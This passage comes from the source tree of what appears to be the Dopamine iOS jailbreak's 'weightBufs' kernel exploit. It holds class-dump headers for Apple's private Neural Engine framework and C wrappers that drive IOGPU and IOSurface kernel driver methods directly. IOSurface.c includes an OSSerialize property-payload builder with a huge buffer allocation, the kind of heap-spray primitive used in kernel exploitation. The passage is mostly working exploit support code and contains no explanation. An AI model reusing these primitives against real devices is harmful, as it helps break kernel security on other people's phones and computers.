* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@class NSData;

@interface _ANEPerformanceStats : NSObject {

	unsigned long long _hwExecutionTime;
	NSData* _perfCounterData;

}

@property (nonatomic,readonly) NSData * perfCounterData;                        //@synthesize perfCounterData=_perfCounterData - In the implementation block
@property (nonatomic,readonly) unsigned long long hwExecutionTime;              //@synthesize hwExecutionTime=_hwExecutionTime - In the implementation block
+(id)new;
+(unsigned)driverMaskForANEFMask:(unsigned)arg1 ;
+(id)statsWithRequestPerformanceBuffer:(void*)arg1 statsBufferSize:(unsigned*)arg2 ;
+(id)statsWithHardwareExecutionNS:(unsigned long long)arg1 ;
-(id)init;
-(id)description;
-(unsigned long long)hwExecutionTime;
-(void)emitPerfcounterSignpostsWithModelStringID:(unsigned long long)arg1 ;
-(id)performanceCounters;
-(id)initWithHardwareExecution:(unsigned long long)arg1 perfCounterData:(id)arg2 ;
-(id)initWithRequestPerformanceBuffer:(void*)arg1 statsBufferSize:(unsigned*)arg2 ;
-(NSData *)perfCounterData;
-(id)stringForPerfCounter:(int)arg1 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEProgramForEvaluation.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol OS_dispatch_semaphore;
@class _ANEDeviceController, NSObject;

@interface _ANEProgramForEvaluation : NSObject {

	char _queueDepth;
	_ANEDeviceController* _controller;
	unsigned long long _programHandle;
	unsigned long long _intermediateBufferHandle;
	NSObject*<OS_dispatch_semaphore> _requestsInFlight;
	long long _currentAsyncRequestsInFlight;

}

@property (nonatomic,readonly) _ANEDeviceController * controller;                              //@synthesize controller=_controller - In the implementation block
@property (assign,nonatomic) unsigned long long programHandle;                                 //@synthesize programHandle=_programHandle - In the implementation block
@property (assign,nonatomic) unsigned long long intermediateBufferHandle;                      //@synthesize intermediateBufferHandle=_intermediateBufferHandle - In the implementation block
@property (nonatomic,readonly) char queueDepth;                                                //@synthesize queueDepth=_queueDepth - In the implementation block
@property (nonatomic,readonly) NSObject*<OS_dispatch_semaphore> requestsInFlight;              //@synthesize requestsInFlight=_requestsInFlight - In the implementation block
@property (assign,nonatomic) long long currentAsyncRequestsInFlight;                           //@synthesize currentAsyncRequestsInFlight=_currentAsyncRequestsInFlight - In the implementation block
+(id)new;
+(id)programWithHandle:(unsigned long long)arg1 intermediateBufferHandle:(unsigned long long)arg2 queueDepth:(char)arg3 ;
-(void)dealloc;
-(id)init;
-(unsigned long long)intermediateBufferHandle;
-(_ANEDeviceController *)controller;
-(id)description;
-(id)initWithHandle:(unsigned long long)arg1 intermediateBufferHandle:(unsigned long long)arg2 queueDepth:(char)arg3 ;
-(unsigned long long)programHandle;
-(char)queueDepth;
-(NSObject*<OS_dispatch_semaphore>)requestsInFlight;
-(long long)currentAsyncRequestsInFlight;
-(void)setCurrentAsyncRequestsInFlight:(long long)arg1 ;
-(BOOL)processRequest:(id)arg1 qos:(unsigned)arg2 qIndex:(unsigned long long)arg3 modelStringID:(unsigned long long)arg4 options:(id)arg5 error:(id*)arg6 ;
-(void)setProgramHandle:(unsigned long long)arg1 ;
-(void)setIntermediateBufferHandle:(unsigned long long)arg1 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEQoSMapper.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEQoSMapper : NSObject
+(unsigned)aneUserInteractiveTaskQoS;
+(unsigned)aneRealTimeTaskQoS;
+(unsigned)aneUserInitiatedTaskQoS;
+(unsigned)aneDefaultTaskQoS;
+(unsigned)aneUtilityTaskQoS;
+(unsigned)aneBackgroundTaskQoS;
+(unsigned long long)queueIndexForQoS:(unsigned)arg1 ;
+(unsigned long long)realTimeQueueIndex;
+(int)programPriorityForQoS:(unsigned)arg1 ;
+(int)realTimeProgramPriority;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANERequest.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@class NSArray, _ANEIOSurfaceObject, NSNumber, _ANEPerformanceStats;

@interface _ANERequest : NSObject {

	NSArray* _inputArray;
	NSArray* _inputIndexArray;
	NSArray* _outputArray;
	NSArray* _outputIndexArray;
	_ANEIOSurfaceObject* _weightsBuffer;
	NSNumber* _procedureIndex;
	_ANEPerformanceStats* _perfStats;
	/*^block*/id _completionHandler;

}

@property (nonatomic,retain) _ANEPerformanceStats * perfStats;                   //@synthesize perfStats=_perfStats - In the implementation block
@property (nonatomic,readonly) NSArray * inputArray;                             //@synthesize inputArray=_inputArray - In the implementation block
@property (nonatomic,readonly) NSArray * inputIndexArray;                        //@synthesize inputIndexArray=_inputIndexArray - In the implementation block
@property (nonatomic,readonly) NSArray * outputArray;                            //@synthesize outputArray=_outputArray - In the implementation block
@property (nonatomic,readonly) NSArray * outputIndexArray;                       //@synthesize outputIndexArray=_outputIndexArray - In the implementation block
@property (nonatomic,readonly) _ANEIOSurfaceObject * weightsBuffer;              //@synthesize weightsBuffer=_weightsBuffer - In the implementation block
@property (nonatomic,copy,readonly) NSNumber * procedureIndex;                   //@synthesize procedureIndex=_procedureIndex - In the implementation block
@property (copy) id completionHandler;                                           //@synthesize completionHandler=_completionHandler - In the implementation block
+(id)requestWithInputs:(id)arg1 inputIndices:(id)arg2 outputs:(id)arg3 outputIndices:(id)arg4 weightsBuffer:(id)arg5 procedureIndex:(id)arg6 ;
+(id)requestWithInputs:(id)arg1 inputIndices:(id)arg2 outputs:(id)arg3 outputIndices:(id)arg4 procedureIndex:(id)arg5 ;
-(BOOL)validate;
-(_ANEIOSurfaceObject *)weightsBuffer;
-(void)setCompletionHandler:(id)arg1 ;
-(id)description;
-(id)completionHandler;
-(NSArray *)inputArray;
-(NSArray *)inputIndexArray;
-(NSArray *)outputArray;
-(NSArray *)outputIndexArray;
-(NSNumber *)procedureIndex;
-(void)setPerfStats:(_ANEPerformanceStats *)arg1 ;
-(_ANEPerformanceStats *)perfStats;
-(id)initWithInputs:(id)arg1 inputIndices:(id)arg2 outputs:(id)arg3 outputIndices:(id)arg4 weightsBuffer:(id)arg5 procedureIndex:(id)arg6 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEStrings.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEStrings : NSObject
+(id)cacheDirectory;
+(id)machServiceName;
+(id)errorDomainGeneric;
+(id)testing_cacheDirectory;
+(id)testing_inputDirectory;
+(id)testing_modelDirectory;
+(id)cacheDeleteServiceName;
+(id)machServiceNamePrivate;
+(id)modelCacheDirectoryWithBuildVersion:(id)arg1 ;
+(id)tempDirectory;
+(id)cloneDirectory;
+(id)errorDomainCompiler;
+(id)errorDomainEspresso;
+(id)restrictedAccessEntitlement;
+(id)compilerServiceAccessEntitlement;
+(id)modelBinaryName;
+(id)defaultCompilerOptionsFilename;
+(id)dataVaultStorageClass;
+(id)testing_cacheDirectoryWithSuffix:(id)arg1 ;
+(id)testing_cacheDirectoryWithSuffix:(id)arg1 buildVersion:(id)arg2 ;
+(id)testing_tempDirectory:(id)arg1 ;
+(id)testing_cloneDirectory:(id)arg1 ;
+(id)testing_modelDirectory:(id)arg1 ;
+(id)testing_modelNames;
+(id)testing_encryptedModelNames;
+(id)testing_dataVaultStorageClass;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/IOGPU.c`:

```c
#include "IOGPU.h"

struct IOGPUNotificationQueueData * do_s_create_notificationqueue(io_connect_t client)
{

        uint32_t structInputCnt = 0;
        uint32_t structOutputCnt = 16;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        args->client = client;

#if TARGET_OS_OSX
        u32 selector = 17;
#else
        u32 selector = 15;
#endif
        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);

        CHECK_IOKIT_ERR(kr, "s_create_notificationqueue");

        struct IOGPUNotificationQueueData * output = (struct IOGPUNotificationQueueData *)args->sOutput;
        args->sOutput = NULL;

        destroy_args(args);
        return output;
}


void do_s_destroy_notificationqueue(io_connect_t client,uint32_t id)
{

        uint32_t structInputCnt = 0;
        uint32_t structOutputCnt = 0;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        args->client = client;

        args->scalarISize = 1;
        args->scalarI[0] = id;

#if TARGET_OS_OSX
        u32 selector = 18;
#else
        u32 selector = 16;
#endif

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_destroy_notificationqueue");

        destroy_args(args);
}


struct shmem * do_s_create_shmem(io_connect_t client,uint32_t shm_size,uint32_t shm_type)
{

        uint32_t structInputCnt = 0;
        uint32_t structOutputCnt = 16;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        args->client = client;

        args->scalarISize = 2;
        args->scalarI[0] = shm_size; // size
        args->scalarI[1] = shm_type; // shmem type

        // types : 2 -> AGXDebugBufferShmem, else : IOGPUDeviceShmem

#if TARGET_OS_OSX
        u32 selector = 15;
#else
        u32 selector = 13;
#endif

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_create_shmem");
        if(kr != KERN_SUCCESS) {
                destroy_args(args);
                return NULL;
        }

        struct shmem * output = (struct shmem *)args->sOutput;
        args->sOutput = NULL;
        destroy_args(args);
        return output;
}

kern_return_t do_s_new_command_queue(io_connect_t client,void *in,uint32_t *queue_id)
{

        uint32_t structInputCnt = 1032;
        uint32_t structOutputCnt = 16;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        uint8_t * input = (uint8_t *)args->sInput;
        memcpy(input,in,structInputCnt);

        args->client = client;


#if TARGET_OS_OSX
        u32 selector = 8;
#else
        u32 selector = 7;
#endif

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_new_command_queue");
        *queue_id = *(uint32_t *)args->sOutput;

        destroy_args(args);
        return kr;
}

void do_s_submit_command_buffers(io_connect_t client,uint32_t cmdqID,uint8_t *buf,uint32_t size)
{

        uint32_t structInputCnt = size;
        uint32_t structOutputCnt = 0;
        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        uint8_t * input = (uint8_t *)args->sInput;
        memcpy(input,buf,size);
        args->client = client;

        args->scalarISize = 1;
        args->scalarI[0] = cmdqID;

#if TARGET_OS_OSX
        u32 selector = 30;
#else
        u32 selector = 26;
#endif

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_submit_command_buffers");
        destroy_args(args);
}

kern_return_t do_s_set_command_queue_notification_queue(io_connect_t client,uint32_t command_id,uint32_t notify_id)
{

        uint32_t structInputCnt = 0;
        uint32_t structOutputCnt = 0;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        args->client = client;

        args->scalarISize = 2;
        args->scalarI[0] = command_id;
        args->scalarI[1] = notify_id;
#if TARGET_OS_OSX
        u32 selector = 29;
#else
        u32 selector = 25;
#endif

        kern_return_t kr =  IOConnectCallMethod(args->client,
                                                selector,
                                                args->scalarI,args->scalarISize,
                                                args->sInput, args->sInputSize,
                                                args->scalarO, (uint32_t *)&args->scalarOSize,
                                                args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_set_command_queue_notification_queue");
        destroy_args(args);
        return kr;
}

```

`Application/Dopamine/Exploits/weightBufs/exploit/IOGPU.h`:

```h
#ifndef H_IOGPU_H
#define H_IOGPU_H

#include "iokit.h"

struct IOGPUNotificationQueueData
{
        uint64_t address;
        uint32_t id;
};

struct shmem {
        uint8_t *shm_addr;
        uint32_t shm_len;
        uint32_t shm_id;
};

typedef struct {
        vm_address_t gpuAddress;
        vm_address_t shm_addr;
        vm_address_t ro_addr;
        uint32_t unk_0x18;
        int resource_id;
        size_t resident_size;
        uint64_t unk_0x28;
        uint64_t unk_0x30;
        uint64_t unk_0x38;
        uint64_t protection;
        uint64_t unk_0x48;
}IOGPUNewResourceReturnData;

typedef uint32_t u32;
typedef uint64_t u64;
typedef struct {
        uint32_t field_0;
        uint32_t count; // how many submitArgs do we have in this structure ?
} IOGPUCommandQueueSubmitArgs_Header_t;

typedef struct {
        uint32_t shmid_1;
        uint32_t shmid_3;
        uint32_t shmid_2;
        uint64_t notify_1;
        uint64_t notify_2;
        uint32_t debug_shm_id;
        uint32_t padding;
} IOGPUCommandQueueSubmitArgs_Command_t;


typedef struct {
        IOGPUCommandQueueSubmitArgs_Header_t hdr;
        IOGPUCommandQueueSubmitArgs_Command_t body[1];
} IOGPUCommandQueueSubmitArgs_t;



/* Shmem1 struct for s_submit_command_buffers() */

struct IOGPUKernelCommand_Cmd_0x10005 {
        u64 mtlateevent_id;
        u64 kdebug_id;
};

struct IOGPUKernelCommand_Cmd_0x10003 {
        u64 var1; // must be less than 0x100
		u64 unused;
};

struct IOGPUKernelCommand_Cmd_0x2 {
        u64 sleep; // put the thread to sleep
};

struct IOGPUKernelCommand_Cmd_0x3 {
        u32 IOSurfacesharedEventId;
		u32 padd;
		u64 raw_64;
};

struct IOGPUKernelCommand_Cmd_0x4 {
        u32 IOSurfacesharedEventId;
		u32 padd;
		u64 raw_64;
};

struct IOGPUKernelCommand_Cmd_0x5 {
        u64 MTLEventId;
		u64 tosubmit;
};

struct IOGPUKernelCommand_Cmd_0x6 {
        u64 MTLEventId;
		u64 value;
};

// must be bigger than > 4
struct IOGPUKernelCommand_Cmd_0x8 {
        u32 resId_count;
		u32 resourceIds[];
};


struct IOGPUKernelCommand_Cmd_0x9 {
        u64 protection;
};

union IOGPUKernelCommand_Cmd
{
        /* ... */
        /* processKernelCommands ... */
		struct IOGPUKernelCommand_Cmd_0x10003 Cmd_0x10003;
		struct IOGPUKernelCommand_Cmd_0x10005 Cmd_0x10005;
		struct IOGPUKernelCommand_Cmd_0x2 Cmd_0x2;
		struct IOGPUKernelCommand_Cmd_0x3 Cmd_0x3;
		struct IOGPUKernelCommand_Cmd_0x4 Cmd_0x4;
		struct IOGPUKernelCommand_Cmd_0x5 Cmd_0x5;
		struct IOGPUKernelCommand_Cmd_0x6 Cmd_0x6;
		struct IOGPUKernelCommand_Cmd_0x8 Cmd_0x8;
		struct IOGPUKernelCommand_Cmd_0x9 Cmd_0x9;

};

struct IOGPUKernelCommand
{
        int type;
        int size;
        union IOGPUKernelCommand_Cmd cmd;
};



/* Shmem3 struct for s_submit_command_buffers() */
struct Shmem3_header
{
        uint32_t field0;
        uint32_t field4;
        uint32_t count;
        uint32_t fieldC;
};

struct Shmem3_offsets
{
        uint32_t kernelCommandStart;
        uint32_t kernelCommandEnd;
};

struct Shmem3
{
        struct Shmem3_header hdr;
        struct Shmem3_offsets off;
};



IOGPUNewResourceReturnData * do_s_new_resource(io_connect_t client, const char *str,size_t size, int *retval);
struct IOGPUNotificationQueueData * do_s_create_notificationqueue(io_connect_t client);
void do_s_destroy_notificationqueue(io_connect_t client,uint32_t id);
struct shmem * do_s_create_shmem(io_connect_t client,uint32_t shm_size,uint32_t shm_type);
kern_return_t do_s_new_command_queue(io_connect_t client,void *in,uint32_t *queue_id);
void do_s_submit_command_buffers(io_connect_t client,uint32_t cmdqID,uint8_t *buf,uint32_t size);
kern_return_t do_s_set_command_queue_notification_queue(io_connect_t client,uint32_t command_id,uint32_t notify_id);

#endif  /* H_IOGPU_H */


```

`Application/Dopamine/Exploits/weightBufs/exploit/IOSurface.c`:

```c
#include "IOSurface.h"

io_connect_t get_surface_client(void)
{
        return iokit_get_connection("IOSurfaceRoot",0);
}


io_connect_t create_surface_fast_path(io_connect_t surface,uint32_t *surface_id,IOSurfaceFastCreateArgs *args)
{
        io_connect_t conn = surface;
        kern_return_t kr = KERN_SUCCESS;

        char output[IOSurfaceLockResultSize] = {0};
        size_t output_cnt = IOSurfaceLockResultSize;

        if (surface == 0) {
                conn = get_surface_client();
        }

        kr = IOConnectCallMethod(conn, 6, 0,0,
                                 args, 0x20,
                                 NULL, NULL, output, &output_cnt);
        CHECK_IOKIT_ERR(kr, "create_surface_fast_path");
        assert(kr == KERN_SUCCESS);

        if (surface_id != NULL)
                *surface_id = *(uint32_t *)(output + 0x18);

        return conn;
}

io_connect_t release_surface(io_connect_t surface,uint32_t surface_id)
{
        io_connect_t conn = surface;
        kern_return_t kr = KERN_SUCCESS;

        uint64_t scalar = (uint64_t)surface_id;
        kr = IOConnectCallMethod(conn, 1, &scalar,1,
                                 NULL,0,
                                 NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "release_surface");
        assert(kr == KERN_SUCCESS);

        return conn;
}


mach_port_t iosurface_create_shared_event(io_connect_t c)
{
        kern_return_t kr = KERN_SUCCESS;

        uint32_t outputSize = 1;
        uint64_t port = 0;
        kr = IOConnectCallMethod(c, 36, 0,0,
                                 NULL, 0,
                                 &port, &outputSize, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "do_create_shared_event");
        return (mach_port_t)port;
}

kern_return_t iosurface_signal_shared_event(io_connect_t c,mach_port_t sharedRefId, uint64_t signal)
{
        kern_return_t kr = KERN_SUCCESS;
        uint64_t scalar[2] = {(uint64_t)sharedRefId,signal};

        kr = IOConnectCallMethod(c, 37, scalar,2,
                                 NULL, 0,
                                 NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "iosurface_signal_shared_event");
        return kr;
}


kern_return_t iosurface_query_shared_event(io_connect_t c,mach_port_t sharedRefId)
{
        kern_return_t kr = KERN_SUCCESS;
        uint64_t scalar[1] = {(uint64_t)sharedRefId};
        uint64_t scalarO[2] = {0};
        uint32_t scalarOSize = 2;

        kr = IOConnectCallMethod(c, 38, scalar,1,
                                 NULL, 0,
                                 scalarO,&scalarOSize , NULL, NULL);
        CHECK_IOKIT_ERR(kr, "iosurface_query_shared_event");
        //printf("Completed Value 0x%llx \n",scalarO[0]);

        return kr;
}

kern_return_t iosurface_notify_shared_event(io_connect_t c,mach_port_t sharedRefId,
                                            uint64_t arg1,
                                            uint64_t arg2,
                                            uint64_t arg3,
                                            uint64_t arg4)
{
        kern_return_t kr = KERN_SUCCESS;
        uint64_t scalar[5] = {(uint64_t)sharedRefId,arg1,arg2,arg3,arg4};

        kr = IOConnectCallMethod(c, 39, scalar,5,
                                 NULL, 0,
                                 NULL,NULL , NULL, NULL);
        CHECK_IOKIT_ERR(kr, "iosurface_noitfy_shared_event");

        return kr;
}


void add_shared_event_notification_port(io_connect_t c,mach_port_t port,uint64_t *references)
{
        kern_return_t kr = KERN_SUCCESS;

        kr = IOConnectCallAsyncMethod(c, 40, port, references, 8,
                                      NULL, 0,
                                      NULL, 0,
                                      NULL, NULL,
                                      NULL, NULL);
        CHECK_IOKIT_ERR(kr, "add_shared_event_notification_port");
}


void notify_shared_event(io_connect_t c,u64 sharedRefId, u64 refcon, u64 a,u64 b,u64 cc)
{
        kern_return_t kr = KERN_SUCCESS;

        uint64_t scalars[5] = {sharedRefId,refcon,a,b,cc};
        kr = IOConnectCallMethod(c, 39, scalars,5,
                                 NULL, 0,
                                 NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "do_create_shared_event");

}



uint32_t *prop_data = 0;
vm_size_t prop_data_size = 0xff000000;
void * init_iosurface_prop_data(void)
{
        if(prop_data)
                return prop_data;

        mach_vm_address_t addr = 0;
#if TARGET_OS_IOS
        prop_data_size = 0xf000000;
#endif
        kern_return_t kr = _kernelrpc_mach_vm_allocate_trap(mach_task_self(),&addr,prop_data_size,1);

        CHECK_IOKIT_ERR(kr, "allocate_properties_buf");
        prop_data = (uint32_t*)addr;
        return prop_data;

}


void iosurface_remove_property(io_connect_t surface,uint32_t surface_id,uint32_t key)
{

        kern_return_t kr = KERN_SUCCESS;
        uint64_t _output = 0;
        size_t output_cnt = 4;

        uint64_t payload[2];
        payload[0] = surface_id;
        payload[1] = key;

        kr = IOConnectCallMethod(surface, 11,
                                 NULL,
                                 0,
                                 payload,
                                 0x10,
                                 NULL, NULL,
                                 &_output, &output_cnt);

        assert(kr == KERN_SUCCESS);
}

void iosurface_get_value(io_connect_t client,uint32_t surface_id,uint32_t key,void *output,size_t *outputSize)
{

        kern_return_t kr = KERN_SUCCESS;
        uint64_t payload[2];
        payload[0] = surface_id;
        payload[1] = key;

        kr = IOConnectCallMethod(client,
                                 10,
                                 NULL,
                                 0,
                                 payload,
                                 0x10,
                                 NULL, NULL,
                                 output, outputSize);

        assert(kr == KERN_SUCCESS);
}

void iosurface_set_value(io_connect_t surface,uint32_t surface_id)
{
        kern_return_t kr = KERN_SUCCESS;
        uint64_t _output = 0;
        size_t output_cnt = 4;

        *(uint64_t *) prop_data =  surface_id;

        kr = IOConnectCallMethod(surface, 9,
                                 NULL,
                                 0,
                                 prop_data,
                                 prop_data_size,
                                 NULL, NULL,
                                 &_output, &output_cnt);

        CHECK_IOKIT_ERR(kr, "iosurface_set_value");
        assert(kr == KERN_SUCCESS);
}

uint32_t build_iosurface_payload(uint32_t count,uint8_t *data,uint32_t datasize,uint32_t key)
{
        assert(prop_data != NULL);

        uint32_t * binary = prop_data + 2;
        memset((char *)prop_data,0,prop_data_size );

        int cur = 0;

        binary[cur++]  = kOSSerializeBinarySignature;
        binary[cur++]  = (kOSSerializeEndCollection| kOSSerializeArray | 2);

        binary[cur++] = (kOSSerializeArray | count);
        // count : how many object we want ?
        for(int i=0; i< count; i++) {
                int end = (i == (count -1))? kOSSerializeEndCollection : 0;
                binary[cur++]  = (end |kOSSerializeData | datasize );
                memcpy((char *)&binary[cur],data,datasize);
                cur +=  (datasize +3)/4;
        }

        binary[cur++]  = (kOSSerializeEndCollection | kOSSerializeSymbol | 5); // key
        binary[cur++]  = key;
        binary[cur++]  = 0;
        return cur;
}

uint32_t build_surface_payload_with_string(uint32_t count,char *string,uint32_t stringsize,uint32_t key)
{

        uint32_t * binary = prop_data + 2;//a place for surface id
        memset((char *)prop_data,0,prop_data_size);

        int cur = 0;

        binary[cur++]  = kOSSerializeBinarySignature;
        binary[cur++]  = (kOSSerializeEndCollection| kOSSerializeArray | 2);

        binary[cur++] = (kOSSerializeArray | count);
        // count : how many object we want ?
        for(int i=0; i< count; i++) {
                int end = (i == (count -1))? kOSSerializeEndCollection : 0;
                binary[cur++]  = (end |kOSSerializeString | stringsize -1 );
                memcpy((char *)&binary[cur],string,stringsize);
                cur +=  (stringsize +3)/4;
        }

        binary[cur++]  = (kOSSerializeEndCollection | kOSSerializeSymbol | 5); // key
        binary[cur++]  = key;
        binary[cur++]  = 0;
        return cur;
}

void set_indexed_timestamp(io_connect_t c,uint32_t surface_id,uint64_t index,uint64_t value)
{
        uint64_t args[3] = {0};
        args[0] = surface_id;
        args[1] = index;
        args[2] = value;
        kern_return_t kr = IOConnectCallMethod(c, 33, args,3,
                                               NULL, 0,
                                               NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "set_indexed_timestamp");
}

kern_return_t iosurface_get_use_count(io_connect_t c,uint32_t surface_id,uint32_t *output)
{
        uint64_t args[1] = {0};
        args[0] = surface_id;
        uint32_t outsize = 1;
        uint64_t out = 0;

        kern_return_t kr = IOConnectCallMethod(c, 16, args,1,
                                               NULL, 0,
                                               &out, &outsize, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "iosurface_get_use_count");
        *output = (uint32_t)out;
        return kr;
}

```

`Application/Dopamine/Exploits/weightBufs/exploit/IOSurface.h`:

```h
#ifndef H_IOSURFACE_H
#define H_IOSURFACE_H

#include "iokit.h"
#include <IOSurface/IOSurfaceRef.h>

#define IOSurfaceLockResultSize 0xF60

#define kOSSerializeBinarySignature        0x000000D3
#define kOSSerializeIndexedBinarySignature 0x000000D4

typedef struct IOSurfaceFastCreateArgs
{
        uint64_t IOSurfaceAddress;
        uint32_t IOSurfaceWidth;
        uint32_t IOSurfaceHeight;
        uint32_t IOSurfacePixelFormat;
        uint32_t IOSurfaceBytesPerElement;
        uint32_t IOSurfaceBytesPerRow;
        uint32_t IOSurfaceAllocSize;
} IOSurfaceFastCreateArgs;


io_connect_t get_surface_client(void);
io_connect_t release_surface(io_connect_t surface,uint32_t surface_id);
io_connect_t create_surface_fast_path(io_connect_t surface,uint32_t *surface_id,IOSurfaceFastCreateArgs *args);
void set_indexed_timestamp(io_connect_t c,uint32_t surface_id,uint64_t index,uint64_t value);
kern_return_t iosurface_get_use_count(io_connect_t c,uint32_t surface_id,uint32_t *output);
void iosurface_remove_property(io_connect_t ,uint32_t ,uint32_t );

typedef uint64_t u64;

mach_port_t iosurface_create_shared_event(io_connect_t c);
kern_return_t iosurface_signal_shared_event(io_connect_t c,mach_port_t sharedRefId, uint64_t signal);
kern_return_t iosurface_query_shared_event(io_connect_t c,mach_port_t sharedRefId);
kern_return_t iosurface_notify_shared_event(io_connect_t c,mach_port_t sharedRefId,
                                            uint64_t arg1,
                                            uint64_t arg2,
                                            uint64_t arg3,
                                            uint64_t arg4);


void add_shared_event_notification_port(io_connect_t c,mach_port_t port,uint64_t *references);
void notify_shared_event(io_connect_t ,u64 , u64 , u64 ,u64 ,u64 );
void iosurface_set_value(io_connect_t ,uint32_t );
void * init_iosurface_prop_data(void);
uint32_t build_iosurface_payload(uint32_t count,uint8_t *data,uint32_t datasize,uint32_t key);
uint32_t build_surface_payload_with_string(uint32_t count,char *string,uint32_t stringsize,uint32_t key);


#endif  /* H_IOSURFACE_H */

```

`Application/Dopamine/Exploits/weightBufs/exploit/aneProgram.h`:

```h
#ifndef H_ANEPROGRAM_H
#define H_ANEPROGRAM_H

#include <stdio.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach-o/loader.h>

typedef unsigned int ZinComputeProgramStatus;
struct ZinComputeProgramInitInfo;
struct ZinComputeProgramStruct;
struct ZinComputeProgramSection;
typedef struct ZinComputeProgramStruct ZinComputeProgram;

typedef uint64_t u64;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint8_t u8;

#define FOR_EACH_COMMAND                                                \
        lc = (load_command*)(mh + 1);                                   \
        for (int i = 0; i < mh->ncmds; ++i, lc = (load_command*)((char*)lc + lc->cmdsize))


CFMutableDictionaryRef ANECCreateModelDictionary(void *, size_t);
ZinComputeProgramStatus  ZinComputeProgramUpdateMutables(uint32_t,void *,void *, size_t,void *,size_t);

ZinComputeProgramStatus ZinComputeProgramMakeInitInfo(
        const ZinComputeProgram *,
        struct ZinComputeProgramInitInfo **);

ZinComputeProgramStatus ZinComputeProgramMake(
        struct mach_header_64 *,
        size_t,
        struct ZinComputeProgramStruct **);

ZinComputeProgramStatus  ZinComputeProgramHasMutableOperation(
        struct ZinComputeProgramStruct *,
        boolean_t *);

ZinComputeProgramStatus __cdecl ZinComputeProgramGetInitSection(
        const ZinComputeProgram *program,
        struct ZinComputeProgramSection **SectionOut);

ZinComputeProgramStatus __cdecl ZinComputeProgramCompareCompilerVersion(const char *, const char *, int32_t *);

ZinComputeProgramStatus ZinComputeProgramGetNamesFromMultiPlaneLinear(struct load_command *,u32 *, u64*, u32 *,u64 *);

long ZinComputeProgramGetNamesFromMultiPlaneTiledCompressed(struct load_command *,u32 *,
                                                                       u64 *,
                                                                       u64 *,
                                                                       u64 *,
                                                                       u64 *);

struct ZinComputeProgramSectionInfo
{
        struct
        {
                int  bufferType;
                struct ZinComputeProgramSection *ComputeSgment;
        }infos;
};

